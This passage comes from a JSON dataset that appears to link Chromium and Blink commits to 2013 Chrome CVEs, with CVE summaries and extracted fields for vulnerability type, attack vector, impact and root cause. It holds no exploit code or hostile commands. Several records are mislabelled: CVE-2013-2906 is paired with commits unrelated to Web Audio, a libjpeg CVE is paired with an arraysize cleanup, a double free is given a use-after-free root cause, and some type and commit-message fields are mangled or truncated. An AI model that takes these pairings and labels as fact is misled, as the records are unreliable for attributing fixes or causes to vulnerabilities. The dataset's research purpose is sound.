attacker"},{"commit_id":"f084d7007f67809ef116ee6b11f251bf3c9ed895","cve_id":"CVE-2013-6625","cwe_id":"CWE-399","commit_message":"Notify nodes removal to Range\/Selection after dispatching blur and mutation event\n\nThis patch changes notifying nodes removal to Range\/Selection after dispatching blur and mutation event. In willRemoveChildren(), like willRemoveChild(); r115686 did same change, although it didn't change willRemoveChildren().\n\nThe issue 295010, use-after-free, is caused by setting removed node to Selection in mutation event handler.\n\nBUG=295010\nTEST=LayoutTests\/fast\/dom\/Range\/range-created-during-remove-children.html, LayoutTests\/editing\/selection\/selection-change-in-mutation-event-by-remove-children.html, LayoutTests\/editing\/selection\/selection-change-in-blur-event-by-remove-children.html\nR=tkent@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/25389004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@159007 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in core\/dom\/ContainerNode.cpp in Blink, as used in Google Chrome before 31.0.1650.48, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper handling of DOM range objects in circumstances that require child node removal after a (1) mutation or (2) blur event.","commit_message_1":"notify node removal to range\/selection after dispatching blur and mutation event this patch change notifying node removal to range\/selection after dispatching blur and mutation event","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper handling of dom range objects in circumstances that require child node removal after a mutation or blur event ","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"90fb08ed0146c9beacfd4dde98a20fc45419fff3","cve_id":"CVE-2013-6626","cwe_id":null,"commit_message":"Cancel JavaScript dialogs when an interstitial appears.\n\nBUG=295695\nTEST=See bug for repro steps.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/24360011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@225026 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The WebContentsImpl::AttachInterstitialPage function in content\/browser\/web_contents\/web_contents_impl.cc in Google Chrome before 31.0.1650.48 does not cancel JavaScript dialogs upon generating an interstitial warning, which allows remote attackers to spoof the address bar via a crafted web site.","commit_message_1":"cancel javascript dialog when an interstitial appears","Vulnerability Type":"unspecified","Attack Vector":"via a crafted web site","Impact":"spoof the address bar","Root Cause":"does not cancel javascript dialogs upon generating an interstitial warning","Attack Type":"remote attacker"},{"commit_id":"805eabb91d386c86bd64336c7643f6dfa864151d","cve_id":"CVE-2013-6630","cwe_id":"CWE-189","commit_message":"Convert ARRAYSIZE_UNSAFE -> arraysize in base\/.\n\nR=thestig@chromium.org\nBUG=423134\n\nReview URL: https:\/\/codereview.chromium.org\/656033009\n\nCr-Commit-Position: refs\/heads\/master@{#299835}","summary":"The get_dht function in jdmarker.c in libjpeg-turbo through 1.3.0, as used in Google Chrome before 31.0.1650.48 and other products, does not set all elements of a certain Huffman value array during the reading of segments that follow Define Huffman Table (DHT) JPEG markers, which allows remote attackers to obtain sensitive information from uninitialized memory locations via a crafted JPEG image.","commit_message_1":"convert arraysize_unsafe - > arraysize in base\/","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted jpeg image","Impact":"obtain sensitive information from uninitialized memory locations","Root Cause":"does not set all elements of a certain huffman value array during the reading of segments that follow define huffman table ( dht ) jpeg markers","Attack Type":"remote attacker"},{"commit_id":"a19e4877974a6a0cfc53f92c1496a8f995fe2614","cve_id":"CVE-2013-6631","cwe_id":null,"commit_message":"Adding tracking to verify the theory that jankiness of ExtensionMessageFilter::OnExtensionAddListener is because of the observer invocation.\n\nBUG=401560, 417106\n\nReview URL: https:\/\/codereview.chromium.org\/600213002\n\nCr-Commit-Position: refs\/heads\/master@{#296804}","summary":"Use-after-free vulnerability in the Channel::SendRTCPPacket function in voice_engine\/channel.cc in libjingle in WebRTC, as used in Google Chrome before 31.0.1650.48 and other products, allows remote attackers to cause a denial of service (heap memory corruption) or possibly have unspecified other impact via vectors that trigger the absence of certain statistics initialization, leading to the skipping of a required DeRegisterExternalTransport call.","commit_message_1":"adding tracking to verify the theory that jankiness of extensionmessagefilter : :onextensionaddlistener is because of the observer invocation","Vulnerability Type":"use - after - free","Attack Vector":"via vectors that trigger the absence of certain statistics initialization , leading to the skipping of a required deregisterexternaltransport call","Impact":"cause a denial of service ( heap memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"aa1a102f73565feeb1d121d0d6c9524bebcdd75f","cve_id":"CVE-2013-2925","cwe_id":"CWE-399","commit_message":"Don't dispatch events when XHR is set to sync mode\n\nAny of readystatechange, progress, abort, error, timeout and loadend\nevent are not specified to be dispatched in sync mode in the latest\nspec. Just an exception corresponding to the failure is thrown.\n\nClean up for readability done in this CL\n- factor out dispatchEventAndLoadEnd calling code\n- make didTimeout() private\n- give error handling methods more descriptive names\n- set m_exceptionCode in failure type specific methods\n-- Note that for didFailRedirectCheck, m_exceptionCode was not set\n   in networkError(), but was set at the end of createRequest()\n\nThis CL is prep for fixing crbug.com\/292422\n\nBUG=292422\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/24225002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@158046 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in core\/xml\/XMLHttpRequest.cpp in Blink, as used in Google Chrome before 30.0.1599.101, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger multiple conflicting uses of the same XMLHttpRequest object.","commit_message_1":"do n't dispatch event when xhr is set to sync mode any of readystatechange , progress , abort , error , timeout and loadend event are not specified to be dispatched in sync mode in the latest spec","Vulnerability Type":"use - after - free","Attack Vector":"via vectors that trigger multiple conflicting uses of the same xmlhttprequest object","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"e1524692d362e607e806569147096dfb8c38cb6a","cve_id":"CVE-2013-2926","cwe_id":"CWE-399","commit_message":"Remove false assertion in ApplyBlockElementCommand::formatSelection()\n\nNote: This patch is preparation of fixing issue 294456.\n\nThis patch removes false assertion in ApplyBlockElementCommand::formatSelection(), when contents of being indent is modified, e.g. mutation event, |endOfNextParagraph| can hold removed contents.\n\nBUG=294456\nTEST=n\/a\nR=tkent@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/25657004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@158701 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the IndentOutdentCommand::tryIndentingAsListItem function in core\/editing\/IndentOutdentCommand.cpp in Blink, as used in Google Chrome before 30.0.1599.101, allows user-assisted remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to list elements.","commit_message_1":"note : this patch is preparation of fixing issue <number>","Vulnerability Type":"use - after - free","Attack Vector":"impact via vectors related to list elements","Impact":"cause a denial of service or possibly have unspecified other","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"4d77eed905ce1d00361282e8822a2a3be61d25c0","cve_id":"CVE-2013-2927","cwe_id":"CWE-399","commit_message":"Fix a crash in HTMLFormElement::prepareForSubmission.\n\nBUG=297478\nTEST=automated with ASAN.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/24910003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@158428 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the HTMLFormElement::prepareForSubmission function in core\/html\/HTMLFormElement.cpp in Blink, as used in Google Chrome before 30.0.1599.101, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to submission for FORM elements.","commit_message_1":"fix a crash in htmlformelement : :prepareforsubmission","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to submission for form elements","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"94bb8861ec61b4ebcce8a4489be2cf7e2a055d90","cve_id":"CVE-2013-2906","cwe_id":"CWE-362","commit_message":"Fix threading races on ConvolverNode::m_reverb in ConvolverNode::latencyFrames()\n\nAccording to the crash report (https:\/\/cluster-fuzz.appspot.com\/testcase?key=6515787040817152),\nConvolverNode::m_reverb races between ConvolverNode::latencyFrames() and ConvolverNode::setBuffer().\nThis CL adds a proper lock for ConvolverNode::m_reverb.\n\nBUG=223962\nNo tests because the crash depends on threading races and thus not reproducible.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23514037\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@157245 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple race conditions in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to threading in core\/html\/HTMLMediaElement.cpp, core\/platform\/audio\/AudioDSPKernelProcessor.cpp, core\/platform\/audio\/HRTFElevation.cpp, and modules\/webaudio\/ConvolverNode.cpp.","commit_message_1":"in convolvernode : :latencyframes ( ) according to the crash report ( http : \/\/cluster-<file>","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to threading in core \/ html \/ htmlmediaelement . cpp , core \/ platform \/ audio \/ audiodspkernelprocessor . cpp , core \/ platform \/ audio \/ hrtfelevation . cpp , and modules \/ webaudio \/ convolvernode . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Multiple race conditions","Attack Type":"remote attacker"},{"commit_id":"603af455b5641671b18d7d7d166630341d71b63f","cve_id":"CVE-2013-2906","cwe_id":"CWE-362","commit_message":"Remove dependency of TranslateInfobarDelegate on profile\n\nThis CL uses TranslateTabHelper instead of Profile and also cleans up\nsome unused code and irrelevant dependencies.\n\nBUG=371845\n\nReview URL: https:\/\/codereview.chromium.org\/286973003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@270758 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple race conditions in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to threading in core\/html\/HTMLMediaElement.cpp, core\/platform\/audio\/AudioDSPKernelProcessor.cpp, core\/platform\/audio\/HRTFElevation.cpp, and modules\/webaudio\/ConvolverNode.cpp.","commit_message_1":"remove dependency of translateinfobardelegate on profile this cl us translatetabhelper instead of profile and also clean up some unused code and irrelevant dependency","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to threading in core \/ html \/ htmlmediaelement . cpp , core \/ platform \/ audio \/ audiodspkernelprocessor . cpp , core \/ platform \/ audio \/ hrtfelevation . cpp , and modules \/ webaudio \/ convolvernode . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Multiple race conditions","Attack Type":"remote attacker"},{"commit_id":"c2364e0ce42878a2177c6f4cf7adb3c715b777c1","cve_id":"CVE-2013-2906","cwe_id":"CWE-362","commit_message":"[OriginChip] Re-enable the chip as necessary when switching tabs.\n\nBUG=369500\n\nReview URL: https:\/\/codereview.chromium.org\/292493003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@271161 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple race conditions in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to threading in core\/html\/HTMLMediaElement.cpp, core\/platform\/audio\/AudioDSPKernelProcessor.cpp, core\/platform\/audio\/HRTFElevation.cpp, and modules\/webaudio\/ConvolverNode.cpp.","commit_message_1":"re-enable the chip a necessary when switching tab","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to threading in core \/ html \/ htmlmediaelement . cpp , core \/ platform \/ audio \/ audiodspkernelprocessor . cpp , core \/ platform \/ audio \/ hrtfelevation . cpp , and modules \/ webaudio \/ convolvernode . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Multiple race conditions","Attack Type":"remote attacker"},{"commit_id":"c4a4dfb26615b5ef5e9dcc730ef43f70ce9202e2","cve_id":"CVE-2013-2906","cwe_id":"CWE-362","commit_message":"Suspend shared timers while blockingly closing databases\n\nBUG=388771\nR=michaeln@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/409863002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@284785 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple race conditions in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to threading in core\/html\/HTMLMediaElement.cpp, core\/platform\/audio\/AudioDSPKernelProcessor.cpp, core\/platform\/audio\/HRTFElevation.cpp, and modules\/webaudio\/ConvolverNode.cpp.","commit_message_1":"suspend shared timer while blockingly closing database bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to threading in core \/ html \/ htmlmediaelement . cpp , core \/ platform \/ audio \/ audiodspkernelprocessor . cpp , core \/ platform \/ audio \/ hrtfelevation . cpp , and modules \/ webaudio \/ convolvernode . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Multiple race conditions","Attack Type":"remote attacker"},{"commit_id":"bcc265132e3d9b62c6c49facbf849575c615d1e3","cve_id":"CVE-2013-2906","cwe_id":"CWE-362","commit_message":"Cleanups in ScreenOrientationDispatcherHost.\n\nBUG=None\n\nReview URL: https:\/\/codereview.chromium.org\/408213003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@284786 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple race conditions in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to threading in core\/html\/HTMLMediaElement.cpp, core\/platform\/audio\/AudioDSPKernelProcessor.cpp, core\/platform\/audio\/HRTFElevation.cpp, and modules\/webaudio\/ConvolverNode.cpp.","commit_message_1":"cleanup in screenorientationdispatcherhost","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to threading in core \/ html \/ htmlmediaelement . cpp , core \/ platform \/ audio \/ audiodspkernelprocessor . cpp , core \/ platform \/ audio \/ hrtfelevation . cpp , and modules \/ webaudio \/ convolvernode . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Multiple race conditions","Attack Type":"remote attacker"},{"commit_id":"7edf2c655761e7505950013e62c89e3bd2f7e6dc","cve_id":"CVE-2013-2908","cwe_id":null,"commit_message":"Call didAccessInitialDocument when javascript: URLs are used.\n\nBUG=265221\nTEST=See bug for repro.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/22572004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@155790 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 30.0.1599.66 uses incorrect function calls to determine the values of NavigationEntry objects, which allows remote attackers to spoof the address bar via vectors involving a response with a 204 (aka No Content) status code.","commit_message_1":"url are used","Vulnerability Type":"aka No Content","Attack Vector":"via vectors involving a response with a 204 ( aka no content ) status code","Impact":"spoof the address bar","Root Cause":"uses incorrect function calls to determine the values of navigationentry objects","Attack Type":"remote attacker"},{"commit_id":"248a92c21c20c14b5983680c50e1d8b73fc79a2f","cve_id":"CVE-2013-2909","cwe_id":"CWE-399","commit_message":"Update containtingIsolate to go back all the way to top isolate from current root, rather than stopping at the first isolate it finds. This works because the current root is always updated with each isolate run.\n\nBUG=279277\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23972003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@157268 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to inline-block rendering for bidirectional Unicode text in an element isolated from its siblings.","commit_message_1":"update containtingisolate to go back all the way to top isolate from current root , rather than stopping at the first isolate it find","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to inline - block rendering for bidirectional unicode text in an element isolated from its siblings","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within inline-block rendering","Attack Type":"remote attacker"},{"commit_id":"90556c5c9d0a274cc823b713544e9b6064e205cd","cve_id":"CVE-2013-2910","cwe_id":"CWE-399","commit_message":"Rollback option put behind the flag.\n\nBUG=368860\n\nReview URL: https:\/\/codereview.chromium.org\/267393011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@269753 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in modules\/webaudio\/AudioScheduledSourceNode.cpp in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"rollback option put behind the flag","Vulnerability Type":"use - after - free","Attack Vector":"By persuading a victim to visit a malicious Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Web Audio","Attack Type":"remote attacker"},{"commit_id":"0220f39fac21d169a834ef91de362f4169f2eef5","cve_id":"CVE-2013-2911","cwe_id":"CWE-399","commit_message":"Avoid reparsing an XSLT stylesheet after the first failure.\n\nCertain libxslt versions appear to leave the doc in an invalid state when parsing fails. We should cache this result and avoid re-parsing.\n\n(The test cannot be converted to text-only due to its invalid stylesheet).\n\nR=inferno@chromium.org,abarth@chromium.org,pdr@chromium.org\nBUG=271939\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23103007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@156248 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the XSLStyleSheet::compileStyleSheet function in core\/xml\/XSLStyleSheetLibxslt.cpp in Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper handling of post-failure recompilation in unspecified libxslt versions.","commit_message_1":"avoid reparsing an xslt stylesheet after the first failure","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper handling of post - failure recompilation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within XSLT","Attack Type":"remote attacker"},{"commit_id":"5ecc8d42ff888ff8b459df566208e7e01a3be5ba","cve_id":"CVE-2013-2914","cwe_id":"CWE-399","commit_message":"ColorChooserWin::End should act like the dialog has closed\n\nThis is only a problem on Windows.\n\nWhen the page closes itself while the color chooser dialog is open,\nColorChooserDialog::DidCloseDialog was called after the listener has been destroyed.\n\nColorChooserWin::End() will not actually close the color chooser dialog (because we can't) but act like it did so we can do the necessary cleanup.\n\nBUG=279263\nR=jschuh@chromium.org, pkasting@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/23785003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@220639 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the color-chooser dialog in Google Chrome before 30.0.1599.66 on Windows allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to color_chooser_dialog.cc and color_chooser_win.cc in browser\/ui\/views\/.","commit_message_1":"should act like the dialog ha closed this is only a problem on window","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to color _ chooser _ dialog . cc and color _ chooser _ win . cc in browser \/ ui \/ views \/","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Windows color chooser dialog","Attack Type":"remote attacker"},{"commit_id":"b12eb22a27110f49a2ad54b9e4ffd0ccb6cf9ce9","cve_id":"CVE-2013-2915","cwe_id":null,"commit_message":"Delete unneeded pending entries in DidFailProvisionalLoad to prevent a spoof.\n\nBUG=280512\nBUG=278899\nTEST=See bug for repro steps.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23978003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@222146 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 30.0.1599.66 preserves pending NavigationEntry objects in certain invalid circumstances, which allows remote attackers to spoof the address bar via a URL with a malformed scheme, as demonstrated by a nonexistent:12121 URL.","commit_message_1":"delete unneeded pending entry in didfailprovisionalload to prevent a spoof","Vulnerability Type":"unspecified","Attack Vector":"via a url with a malformed scheme , as demonstrated by a nonexistent : 12121 url","Impact":"spoof the address bar","Root Cause":"caused by an error related to 204 No Content status code","Attack Type":"remote attacker"},{"commit_id":"47a054e9ad826421b789097d82b44c102ab6ac97","cve_id":"CVE-2013-2916","cwe_id":null,"commit_message":"Don't wait to notify client of spoof attempt if a modal dialog is created.\n\nBUG=281256\nTEST=See bug for repro steps.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23620020\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@157196 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to spoof the address bar via vectors involving a response with a 204 (aka No Content) status code, in conjunction with a delay in notifying the user of an attempted spoof.","commit_message_1":"do n't wait to notify client of spoof attempt if a modal dialog is created","Vulnerability Type":"aka No Content","Attack Vector":"via vectors involving a response with a 204 ( aka no content ) status code , in conjunction with a delay in notifying the user of an attempted spoof","Impact":"spoof the address bar","Root Cause":"caused by an error related to the 204 No Content status code","Attack Type":"remote attacker"},{"commit_id":"6bdf46c517fd12674ffc61d827dc8987e67f0334","cve_id":"CVE-2013-2917","cwe_id":"CWE-119","commit_message":"Don't read past the end of the impulseResponse array\n\nBUG=281480\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23689004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@157007 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The ReverbConvolverStage::ReverbConvolverStage function in core\/platform\/audio\/ReverbConvolverStage.cpp in the Web Audio implementation in Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to cause a denial of service (out-of-bounds read) via vectors related to the impulseResponse array.","commit_message_1":"do n't read past the end of the impulseresponse array bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"attacker"},{"commit_id":"3ca8e38ff57e83fcce76f9b54cd8f8bfa09c34ad","cve_id":"CVE-2013-2920","cwe_id":"CWE-119","commit_message":"Fix OOB read when parsing protocol-relative URLs\n\nBUG=285742\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/23902014\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@223735 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The DoResolveRelativeHost function in url\/url_canon_relative.cc in Google Chrome before 30.0.1599.66 allows remote attackers to cause a denial of service (out-of-bounds read) via a relative URL containing a hostname, as demonstrated by a protocol-relative URL beginning with a \/\/www.google.com\/ substring.","commit_message_1":"fix oob read when parsing protocol-relative url bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a relative url containing a hostname , as demonstrated by a protocol - relative url beginning with a \/ \/ www . google . com \/ substring","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"1228817ab04a14df53b5a8446085f9c03bf6e964","cve_id":"CVE-2013-2921","cwe_id":"CWE-399","commit_message":"repairs CopyFromCompositingSurface in HighDPI\n\nThis CL removes the DIP=>Pixel transform in\nDelegatedFrameHost::CopyFromCompositingSurface(), because said\ntransformation seems to be happening later in the copy logic\nand is currently being applied twice.\n\nBUG=397708\n\nReview URL: https:\/\/codereview.chromium.org\/421293002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@286414 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Double free vulnerability in the ResourceFetcher::didLoadResource function in core\/fetch\/ResourceFetcher.cpp in the resource loader in Blink, as used in Google Chrome before 30.0.1599.66, allows remote attackers to cause a denial of service or possibly have unspecified other impact by triggering certain callback processing during the reporting of a resource entry.","commit_message_1":"repair copyfromcompositingsurface in highdpi this cl remove the dip= > pixel transform in delegatedframehost : :copyfromcompositingsurface ( ) , because said transformation seems to be happening later in the copy logic and is currently being applied twice","Vulnerability Type":"double free","Attack Vector":"by triggering certain callback processing during the reporting of a resource entry","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within resource loader","Attack Type":"remote attacker"},{"commit_id":"afb848acb43ba316097ab4fddfa38dbd80bc6a71","cve_id":"CVE-2013-2905","cwe_id":"CWE-264","commit_message":"Posix: fix named SHM mappings permissions.\n\nMake sure that named mappings in \/dev\/shm\/ aren't created with\nbroad permissions.\n\nBUG=254159\nR=mark@chromium.org, markus@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/17779002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@209814 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The SharedMemory::Create function in memory\/shared_memory_posix.cc in Google Chrome before 29.0.1547.57 uses weak permissions under \/dev\/shm\/, which allows attackers to obtain sensitive information via direct access to a POSIX shared-memory file.","commit_message_1":"fix named shm mapping permission","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via direct access to a posix shared - memory file","Impact":"obtain sensitive information","Root Cause":"uses weak permissions under \/ dev \/ shm \/","Attack Type":"attacker"},{"commit_id":"87a082c5137a63dedb3fe5b1f48f75dcd1fd780c","cve_id":"CVE-2013-2902","cwe_id":"CWE-399","commit_message":"Removed pinch viewport scroll offset distribution\n\nThe associated change in Blink makes the pinch viewport a proper\nScrollableArea meaning the normal path for synchronizing layer scroll\noffsets is used.\n\nThis is a 2 sided patch, the other CL:\nhttps:\/\/codereview.chromium.org\/199253002\/\n\nBUG=349941\n\nReview URL: https:\/\/codereview.chromium.org\/210543002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@260105 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the XSLT ProcessingInstruction implementation in Blink, as used in Google Chrome before 29.0.1547.57, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to an applyXSLTransform call involving (1) an HTML document or (2) an xsl:processing-instruction element that is still in the process of loading.","commit_message_1":"removed pinch viewport scroll offset distribution the associated change in blink make the pinch viewport a proper scrollablearea meaning the normal path for synchronizing layer scroll offset is used","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to an applyxsltransform call involving an html document or an xsl : processing - instruction element that is still in the process of loading","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within the XSLT implementation","Attack Type":"remote attacker"},{"commit_id":"92029a982fac85a4ebb614a825012a2e9ee84ef3","cve_id":"CVE-2013-2903","cwe_id":"CWE-399","commit_message":"Enforce the maximum length of the folder name in UI.\n\nBUG=355797\nR=xiyuan@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/203863005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@260156 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the HTMLMediaElement::didMoveToNewDocument function in core\/html\/HTMLMediaElement.cpp in Blink, as used in Google Chrome before 29.0.1547.57, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving moving a (1) AUDIO or (2) VIDEO element between documents.","commit_message_1":"enforce the maximum length of the folder name in ui","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving moving a audio or video element between documents","Impact":"cause a denial of service or possibly have unspecified other","Root Cause":"caused by a use-after-free error within the HTMLMediaElement::didMoveToNewDocument function","Attack Type":"remote attacker"},{"commit_id":"01924fbe6c0e0f059ca46a03f9f6b2670ae3e0fa","cve_id":"CVE-2013-2887","cwe_id":null,"commit_message":"Pass ui::LatencyInfo correct with unified gesture detector on Aura.\n\nBUG=379812\nTEST=GestureRecognizerTest.LatencyPassedFromTouchEvent\n\nReview URL: https:\/\/codereview.chromium.org\/309823002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@274602 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in Google Chrome before 29.0.1547.57 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"correct with unified gesture detector on aura","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"afea522e2f80f56fed7e54bd3d2070da358f42f2","cve_id":"CVE-2013-2883","cwe_id":"CWE-399","commit_message":"Fix crash due to unexpected Node deletion during MutationObserver registration book-keeping\n\nR=inferno\nBUG=260165\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/19303002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@154264 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.95 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to deleting the registration of a MutationObserver object.","commit_message_1":"fix crash due to unexpected node deletion during mutationobserver registration book-keeping bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to deleting the registration of a mutationobserver object","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"4ac8bc08e3306f38a5ab3e551aef6ad43753579c","cve_id":"CVE-2013-2884","cwe_id":"CWE-399","commit_message":"Set Attr.ownerDocument in 